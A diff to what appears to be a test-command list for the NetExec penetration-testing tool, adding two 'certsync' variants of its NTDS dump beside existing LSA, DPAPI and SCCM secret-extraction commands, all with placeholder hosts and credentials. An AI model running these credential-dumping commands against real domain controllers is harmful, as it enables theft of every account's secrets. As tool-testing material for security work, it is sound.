@@ -37,6 +37,8 @@ netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --ntds --en
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --ntds --kerberos-keys
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --ntds --trust-keys
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --ntds --just-trust-keys
+netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD --ntds certsync  --user LOGIN_USERNAME
+netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD --ntds certsync --ca-pfx /path/to/ca.pfx
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --lsa
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --dpapi
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --sccm
